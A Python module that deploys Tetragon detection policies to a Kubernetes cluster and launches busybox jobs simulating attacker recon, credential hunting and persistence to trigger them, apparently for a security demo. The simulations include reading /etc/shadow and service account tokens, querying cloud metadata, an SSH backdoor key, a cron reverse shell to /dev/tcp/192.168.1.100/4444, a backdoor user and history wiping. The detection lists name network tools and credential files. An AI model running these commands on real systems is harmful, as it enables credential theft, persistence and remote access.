import json
import datetime
from kubernetes import client, config
from kubernetes.client.exceptions import ApiException

NAMESPACE = "piap"
GROUP = "cilium.io"
VERSION = "v1alpha1"
PLURAL = "tracingpolicies"

POLICY_NAMES = [
    "detect-sensitive-file-read",
    "detect-shell-execution",
    "detect-network-tool",
    "detect-k8s-secret-access",
]

# ── TracingPolicy 1 ───────────────────────────────────────────────────────────
# Alert when any process opens /etc/shadow or /etc/passwd
POLICY_SENSITIVE_FILES = {
    "apiVersion": "cilium.io/v1alpha1",
    "kind": "TracingPolicy",
    "metadata": {"name": "detect-sensitive-file-read"},
    "spec": {
        "kprobes": [
            {
                "call": "fd_install",
                "syscall": False,
                "args": [
                    {"index": 0, "type": "int"},
                    {"index": 1, "type": "file"},
                ],
                "selectors": [
                    {
                        "matchArgs": [
                            {
                                "index": 1,
                                "operator": "Prefix",
                                "values": ["/etc/shadow", "/etc/passwd"],
                            }
                        ]
                    }
                ],
            }
        ]
    },
}

# ── TracingPolicy 2 ───────────────────────────────────────────────────────────
# Alert when a shell binary is executed inside any pod
POLICY_SHELL_EXEC = {
    "apiVersion": "cilium.io/v1alpha1",
    "kind": "TracingPolicy",
    "metadata": {"name": "detect-shell-execution"},
    "spec": {
        "kprobes": [
            {
                "call": "security_bprm_check",
                "syscall": False,
                "args": [{"index": 0, "type": "linux_binprm"}],
                "selectors": [
                    {
                        "matchArgs": [
                            {
                                "index": 0,
                                "operator": "Postfix",
                                "values": ["/sh", "/bash", "/dash", "/ash"],
                            }
                        ]
                    }
                ],
            }
        ]
    },
}

# ── TracingPolicy 3 ───────────────────────────────────────────────────────────
# Alert when network/exfiltration tools are executed.
# wget, curl, nc are common in C2 callbacks, reverse shells, and data exfil.
POLICY_NETWORK_TOOL = {
    "apiVersion": "cilium.io/v1alpha1",
    "kind": "TracingPolicy",
    "metadata": {"name": "detect-network-tool"},
    "spec": {
        "kprobes": [
            {
                "call": "security_bprm_check",
                "syscall": False,
                "args": [{"index": 0, "type": "linux_binprm"}],
                "selectors": [
                    {
                        "matchArgs": [
                            {
                                "index": 0,
                                "operator": "Postfix",
                                "values": ["/wget", "/curl", "/nc", "/ncat", "/netcat", "/nmap"],
                            }
                        ]
                    }
                ],
            }
        ]
    },
}

# ── TracingPolicy 4 ───────────────────────────────────────────────────────────
# Alert when any process reads the Kubernetes service account token.
# This is the primary credential used for container-to-cluster lateral movement.
POLICY_K8S_SECRET_ACCESS = {
    "apiVersion": "cilium.io/v1alpha1",
    "kind": "TracingPolicy",
    "metadata": {"name": "detect-k8s-secret-access"},
    "spec": {
        "kprobes": [
            {
                "call": "fd_install",
                "syscall": False,
                "args": [
                    {"index": 0, "type": "int"},
                    {"index": 1, "type": "file"},
                ],
                "selectors": [
                    {
                        "matchArgs": [
                            {
                                "index": 1,
                                "operator": "Prefix",
                                "values": [
                                    "/var/run/secrets/kubernetes.io/serviceaccount/token"
                                ],
                            }
                        ]
                    }
                ],
            }
        ]
    },
}

ALL_POLICIES = [
    POLICY_SENSITIVE_FILES,
    POLICY_SHELL_EXEC,
    POLICY_NETWORK_TOOL,
    POLICY_K8S_SECRET_ACCESS,
]


def _get_clients():
    try:
        config.load_incluster_config()
    except config.ConfigException:
        config.load_kube_config()
    return client.CustomObjectsApi(), client.CoreV1Api(), client.BatchV1Api()


def deploy_policies():
    """Create or replace all TracingPolicies (cluster-scoped)."""
    api, _, _ = _get_clients()
    results = []
    for policy in ALL_POLICIES:
        name = policy["metadata"]["name"]
        try:
            api.create_cluster_custom_object(GROUP, VERSION, PLURAL, policy)
            results.append(f"Created TracingPolicy: {name}")
        except ApiException as e:
            if e.status == 409:
                api.replace_cluster_custom_object(GROUP, VERSION, PLURAL, name, policy)
                results.append(f"Updated TracingPolicy: {name}")
            else:
                raise
    return results


def remove_policies():
    """Delete all TracingPolicies."""
    api, _, _ = _get_clients()
    results = []
    for name in POLICY_NAMES:
        try:
            api.delete_cluster_custom_object(GROUP, VERSION, PLURAL, name)
            results.append(f"Deleted TracingPolicy: {name}")
        except ApiException as e:
            if e.status == 404:
                results.append(f"TracingPolicy not found (already removed): {name}")
            else:
                raise
    return results


def get_active_policies():
    """Return list of active TracingPolicy names. Returns [] if CRD not installed."""
    api, _, _ = _get_clients()
    try:
        result = api.list_cluster_custom_object(GROUP, VERSION, PLURAL)
        return [item["metadata"]["name"] for item in result.get("items", [])]
    except ApiException as e:
        if e.status in (404, 405):
            return []
        raise
    except Exception:
        return []


def get_tetragon_events(max_lines=100):
    """
    Read recent Tetragon JSON events from the export-stdout sidecar container.
    Returns a list of parsed event dicts, newest last.
    """
    _, core_v1, _ = _get_clients()
    events = []

    pod_name = None
    for label_selector in [
        "app.kubernetes.io/name=tetragon",
        "app=tetragon",
        "k8s-app=tetragon",
    ]:
        try:
            pods = core_v1.list_namespaced_pod(
                namespace="kube-system",
                label_selector=label_selector,
            )
            if pods.items:
                pod_name = pods.items[0].metadata.name
                break
        except Exception:
            continue

    if not pod_name:
        return events

    for container in ["export-stdout", "tetragon"]:
        try:
            logs = core_v1.read_namespaced_pod_log(
                name=pod_name,
                namespace="kube-system",
                container=container,
                tail_lines=max_lines,
            )
            for line in logs.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    events.append(json.loads(line))
                except json.JSONDecodeError:
                    continue
            if events:
                break
        except Exception:
            continue

    return events


def _launch_job(job_name, command):
    """Internal helper: create a busybox Job in the piap namespace."""
    _, _, batch_v1 = _get_clients()
    job_manifest = {
        "apiVersion": "batch/v1",
        "kind": "Job",
        "metadata": {
            "name": job_name,
            "namespace": NAMESPACE,
            "labels": {"app": "tetragon-attack-sim"},
        },
        "spec": {
            "ttlSecondsAfterFinished": 120,
            "template": {
                "spec": {
                    "containers": [
                        {
                            "name": "attacker",
                            "image": "busybox",
                            "command": ["sh", "-c", command],
                        }
                    ],
                    "restartPolicy": "Never",
                }
            },
            "backoffLimit": 0,
        },
    }
    batch_v1.create_namespaced_job(namespace=NAMESPACE, body=job_manifest)
    return job_name


def simulate_recon():
    """
    Phase 1 — Recon / Environment Discovery.
    First commands an attacker runs after gaining access: user info, system
    info, container detection, environment variables, SUID binary search.
    Triggers: detect-shell-execution
    """
    ts = datetime.datetime.utcnow().strftime("%H%M%S")
    cmd = (
        "echo '[RECON] === Phase 1: Environment Discovery ===';"
        "echo '[RECON] --- User & privilege info ---';"
        "whoami; id; groups;"
        "echo '[RECON] --- System info ---';"
        "uname -a; hostname;"
        "cat /etc/os-release 2>/dev/null | head -5 || true;"
        "echo '[RECON] --- Container detection ---';"
        "cat /proc/1/cgroup 2>/dev/null | head -3 || true;"
        "echo '[RECON] --- Kubernetes secrets dir ---';"
        "ls /var/run/secrets/ 2>/dev/null || echo 'no secrets dir';"
        "echo '[RECON] --- Environment variables ---';"
        "env | sort | head -20;"
        "echo '[RECON] --- SUID binaries (first 10) ---';"
        "find / -perm -4000 -type f 2>/dev/null | head -10 || true;"
        "echo '[RECON] --- Filesystem root ---';"
        "ls -la / 2>/dev/null | head -10;"
        "echo '[RECON] Complete.'"
    )
    return _launch_job(f"sim-recon-{ts}", cmd)


def simulate_credentials():
    """
    Phase 2 — Credential Hunting.
    Reads sensitive credential files and Kubernetes service account tokens —
    the key material attackers use for privilege escalation and lateral movement.
    Triggers: detect-sensitive-file-read, detect-k8s-secret-access, detect-network-tool
    """
    ts = datetime.datetime.utcnow().strftime("%H%M%S")
    cmd = (
        "echo '[CREDS] === Phase 2: Credential Hunting ===';"
        "echo '[CREDS] --- /etc/shadow (hashed passwords) ---';"
        "cat /etc/shadow 2>/dev/null || echo 'Permission denied (not root)';"
        "echo '[CREDS] --- /etc/passwd (user accounts) ---';"
        "cat /etc/passwd 2>/dev/null | head -10 || true;"
        "echo '[CREDS] --- Kubernetes service account token ---';"
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null"
        "  && echo '' || echo 'No token found';"
        "echo '[CREDS] --- Kubernetes namespace ---';"
        "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || true;"
        "echo '[CREDS] --- Scanning environment for secrets ---';"
        "env | grep -iE 'secret|token|password|key|aws|api_' 2>/dev/null || echo 'None found';"
        "echo '[CREDS] --- AWS IMDS metadata endpoint ---';"
        "wget -q -O- --timeout=2 http://169.254.169.254/latest/meta-data/ 2>/dev/null"
        "  || echo 'No cloud metadata available';"
        "echo '[CREDS] Complete.'"
    )
    return _launch_job(f"sim-creds-{ts}", cmd)


def simulate_persistence():
    """
    Phase 3 — Persistence Attempts.
    Tries SSH key injection, crontab modification, and new user creation.
    Most attempts fail due to container permissions, but Tetragon sees them all.
    Triggers: detect-shell-execution, detect-sensitive-file-read
    """
    ts = datetime.datetime.utcnow().strftime("%H%M%S")
    cmd = (
        "echo '[PERSIST] === Phase 3: Persistence Attempts ===';"
        "echo '[PERSIST] --- SSH backdoor (authorized_keys) ---';"
        "mkdir -p /root/.ssh 2>/dev/null || true;"
        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB backdoor@attacker.com'"
        "  >> /root/.ssh/authorized_keys 2>/dev/null"
        "  && echo 'SSH key injected!' || echo 'Cannot write SSH key';"
        "echo '[PERSIST] --- Crontab backdoor ---';"
        "echo '* * * * * root bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"
        "  > /etc/cron.d/backdoor 2>/dev/null"
        "  && echo 'Cron backdoor written!' || echo 'Cannot write to /etc/cron.d';"
        "cat /etc/crontab 2>/dev/null | head -5 || true;"
        "ls -la /etc/cron.d/ 2>/dev/null || true;"
        "echo '[PERSIST] --- New user creation ---';"
        "useradd -m -s /bin/sh backdoor 2>/dev/null"
        "  && echo 'User backdoor created!' || echo 'Cannot create user';"
        "echo '[PERSIST] --- History cleanup (cover tracks) ---';"
        "history -c 2>/dev/null || true;"
        "rm -f ~/.bash_history 2>/dev/null || true;"
        "echo '[PERSIST] Complete.'"
    )
    return _launch_job(f"sim-persist-{ts}", cmd)


# Backward compatibility alias
def simulate_attack():
    return simulate_recon()


def stop_attacks():
    """Delete all running attack simulation jobs in the piap namespace."""
    _, _, batch_v1 = _get_clients()
    jobs = batch_v1.list_namespaced_job(
        namespace=NAMESPACE,
        label_selector="app=tetragon-attack-sim",
    )
    deleted = []
    for job in jobs.items:
        name = job.metadata.name
        batch_v1.delete_namespaced_job(
            name=name,
            namespace=NAMESPACE,
            body=client.V1DeleteOptions(propagation_policy="Background"),
        )
        deleted.append(name)
    return deleted
